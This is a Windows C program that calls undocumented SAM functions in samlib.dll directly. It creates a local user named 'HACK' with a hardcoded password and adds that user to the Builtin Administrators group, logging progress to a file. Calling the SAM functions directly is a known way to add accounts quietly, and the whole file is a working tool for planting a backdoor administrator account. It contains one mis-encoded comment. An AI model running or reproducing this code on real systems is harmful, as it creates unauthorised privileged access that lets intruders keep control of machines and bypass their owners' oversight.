#include <stdio.h>
#include <windows.h>
#include "samlib.h"
#include "../Shared/log.h"

#define want_user L"HACK"
#define want_password L"zxczxczxc"

decltype(&RtlInitUnicodeString) pRtlInitUnicodeString;
decltype(&RtlEqualUnicodeString) pRtlEqualUnicodeString;
decltype(&SamConnect)
    pSamConnect;
decltype(&SamEnumerateDomainsInSamServer) pSamEnumerateDomainsInSamServer;
decltype(&SamLookupDomainInSamServer) pSamLookupDomainInSamServer;
decltype(&SamOpenDomain) pSamOpenDomain;
decltype(&SamCreateUser2InDomain) pSamCreateUser2InDomain;
decltype(&SamSetInformationUser) pSamSetInformationUser;
decltype(&SamLookupNamesInDomain) pSamLookupNamesInDomain;
decltype(&SamOpenAlias) pSamOpenAlias;
decltype(&SamRidToSid) pSamRidToSid;
decltype(&SamAddMemberToAlias) pSamAddMemberToAlias;

NTSTATUS status = STATUS_INVALID_ACCOUNT_NAME, enumDomainStatus;

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}


int main() {
  UNICODE_STRING serverName;
  UNICODE_STRING password;
  UNICODE_STRING user;
  UNICODE_STRING sBuiltin;

  HMODULE hNtdll = LoadLibraryA("ntdll.dll");
  GetProcAddress(hNtdll, "RtlInitUnicodeString");
  pRtlInitUnicodeString = (decltype(&RtlInitUnicodeString))GetProcAddress(
      hNtdll, "RtlInitUnicodeString");
  pRtlEqualUnicodeString = (decltype(&RtlEqualUnicodeString))GetProcAddress(
      hNtdll, "RtlEqualUnicodeString");

  pRtlInitUnicodeString(&serverName, L"localhost");
  pRtlInitUnicodeString(&sBuiltin, L"Builtin");

  // ���üƻ�����
  pRtlInitUnicodeString(&password, want_password);
  pRtlInitUnicodeString(&user, want_user);

  int i;
  NTSTATUS status = STATUS_DATA_ERROR;
  SAMPR_HANDLE hServer = NULL, hDomainHandle = NULL, hUserHandle = NULL;
  ULONG grantAccess;
  ULONG relativeId;
  PSID AccountSID = 0, BuiltSID = 0;
  long enumDomainStatus, changePassStatus;
  unsigned long RID = 0;
  unsigned long outVersion;
  unsigned long domainEnumerationContext = 0;
  unsigned long domainCountReturned;
  PSAMPR_RID_ENUMERATION pEnumDomainBuffer = NULL;
  UNICODE_STRING adminGroup;
  DWORD* adminRID;
  SAMPR_HANDLE hAdminGroup;
  PSID userSID = NULL;
  SAMPR_USER_ALL_INFORMATION userAllInfo = {0};

    FILE* fp = fopen("UserAddLog.txt","a+");
    if (fp == NULL){
        return -1;
    }
    log_set_level(LOG_TRACE);
    log_add_fp(fp,LOG_INFO);

  HMODULE hSamsrv = LoadLibraryA("samlib.dll");
  pSamConnect = (decltype(&SamConnect))GetProcAddress(hSamsrv, "SamConnect");
  pSamEnumerateDomainsInSamServer =
      (decltype(&SamEnumerateDomainsInSamServer))GetProcAddress(
          hSamsrv, "SamEnumerateDomainsInSamServer");
  pSamLookupDomainInSamServer =
      (decltype(&SamLookupDomainInSamServer))GetProcAddress(
          hSamsrv, "SamLookupDomainInSamServer");
  pSamOpenDomain =
      (decltype(&SamOpenDomain))GetProcAddress(hSamsrv, "SamOpenDomain");
  pSamCreateUser2InDomain = (decltype(&SamCreateUser2InDomain))GetProcAddress(
      hSamsrv, "SamCreateUser2InDomain");
  pSamSetInformationUser = (decltype(&SamSetInformationUser))GetProcAddress(
      hSamsrv, "SamSetInformationUser");
  pSamLookupNamesInDomain = (decltype(&SamLookupNamesInDomain))GetProcAddress(
      hSamsrv, "SamLookupNamesInDomain");
  pSamOpenAlias =
      (decltype(&SamOpenAlias))GetProcAddress(hSamsrv, "SamOpenAlias");
  pSamRidToSid = (decltype(&SamRidToSid))GetProcAddress(hSamsrv, "SamRidToSid");
  pSamAddMemberToAlias = (decltype(&SamAddMemberToAlias))GetProcAddress(
      hSamsrv, "SamAddMemberToAlias");

  status = pSamConnect(&serverName, &hServer,
                       SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS |
                           SAM_SERVER_LOOKUP_DOMAIN,
                       FALSE);
  if (NT_SUCCESS(status)) {
    do {
      enumDomainStatus = pSamEnumerateDomainsInSamServer(
          hServer, &domainEnumerationContext, &pEnumDomainBuffer, 1,
          &domainCountReturned);
      for (i = 0; i < domainCountReturned; i++) {
        if (pRtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &sBuiltin,
                                   TRUE)) {
          status = pSamLookupDomainInSamServer(
              hServer, &pEnumDomainBuffer[i].Name, &BuiltSID);
          if (NT_SUCCESS(status)) {
              log_info("[+] SamLookupDomainInSamServer Built \n");
          }
        } else {
          status = pSamLookupDomainInSamServer(
              hServer, &pEnumDomainBuffer[i].Name, &AccountSID);
          if (NT_SUCCESS(status)) {
              log_info("[+] SamLookupDomainInSamServer Account \n");
          }
        }
      }
    } while (enumDomainStatus == STATUS_MORE_ENTRIES);

    status = pSamOpenDomain(hServer, DOMAIN_LOOKUP | DOMAIN_CREATE_USER,
                            AccountSID, &hDomainHandle);
    if (NT_SUCCESS(status)) {
      status =
          pSamCreateUser2InDomain(hDomainHandle, &user, USER_NORMAL_ACCOUNT,
                                  USER_ALL_ACCESS | DELETE | WRITE_DAC,
                                  &hUserHandle, &grantAccess, &relativeId);
      if (NT_SUCCESS(status)) {
          log_info("[+] SamCreateUser2InDomain success. User RID: %d\n",
                relativeId);
        userAllInfo.NtPasswordPresent = TRUE;
        userAllInfo.WhichFields |= USER_ALL_NTPASSWORDPRESENT;

        userAllInfo.UserAccountControl &= 0xFFFFFFFE;
        userAllInfo.UserAccountControl |= USER_NORMAL_ACCOUNT;
        userAllInfo.WhichFields |= USER_ALL_USERACCOUNTCONTROL;
        pRtlInitUnicodeString(&userAllInfo.NtOwfPassword, password.Buffer);

        status = pSamSetInformationUser(hUserHandle, UserAllInformation,
                                        (SAMPR_USER_INFO_BUFFER*)&userAllInfo);
        if (NT_SUCCESS(status)) {
            log_info("[+] SamSetInformationUser success.\n");
        } else
            log_info("[!] SamSetInformationUser error 0x%ld\n", status);
      } else
          log_info("[!] SamCreateUser2InDomain error 0x%ld\n", status);

    } else
        log_info("[!] SamOpenDomain error. 0x%ld\n", status);

    status = pSamOpenDomain(hServer, DOMAIN_LOOKUP, BuiltSID, &hDomainHandle);
    if (NT_SUCCESS(status)) {
      pRtlInitUnicodeString(&adminGroup, L"administrators");

      // Lookup Administrators in Builtin Domain
      status = pSamLookupNamesInDomain(hDomainHandle, 1, &adminGroup, &adminRID,
                                       (PDWORD*)&user);
      if (NT_SUCCESS(status)) {
        status = pSamOpenAlias(hDomainHandle, ALIAS_ADD_MEMBER, *adminRID,
                               &hAdminGroup);
        if (NT_SUCCESS(status)) {
          pSamRidToSid(hUserHandle, relativeId, &userSID);

          // Add user to Administrators
          status = pSamAddMemberToAlias(hAdminGroup, userSID);
          if (NT_SUCCESS(status)) {
              log_info("[+] SamAddMemberToAlias success.\n");
          } else
              log_info("[!] AddMemberToAlias wrong 0x%08X\n", status);
        } else
            log_info("[!] SamOpenAlias error 0x%08X\n", status);
      } else
          log_info("[!] SamLookupNamesInDomain error 0x%08X\n", status);
    }
  } else
    log_info("[!] Samconnect error\n");
  
    log_info("Add User success");
    fclose(fp);
  return 0;
}
